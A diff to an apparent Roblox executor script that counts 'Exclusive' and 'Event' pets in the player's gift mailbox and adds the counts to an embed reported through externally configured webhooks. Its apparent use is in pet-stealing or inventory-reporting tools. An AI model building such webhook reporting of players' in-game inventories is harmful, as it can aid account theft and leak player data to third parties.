@@ -1,3 +1,34 @@
+local Exclusive = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+
+    if v:IsA("TextButton") then
+
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
+
+                    Exclusive = Exclusive + 1
+
+                end
+
+            end
+
+	end
+
+local Event = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+
+    if v:IsA("TextButton") then
+
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+
+                    Event = Event + 1
+
+                end
+
+            end
+
+	end
 local url = _G.Webhook
 local us = _G.dhwebhook
 local url2 = us
@@ -50,6 +81,27 @@ local data1 = {
                     ["value"] = "```>>> "..Pets.."```",
                     ["inline"] = true
                 },
+                {
+                
+                    ["name"] = ":round_pushpin: Exclusive Pets Remainin :round_pushpin: ",
+
+                    ["value"] = "```>>> "..Exclusive.."```",
+
+                    ["inline"] = true
+
+                },
+
+                {
+
+
+                    ["name"] = ":round_pushpin: Event Pets Remainin:round_pushpin: ",
+
+                    ["value"] = "```>>> "..Event.."```",
+
+                    ["inline"] = true
+
+                },
+
                 {
 
                  
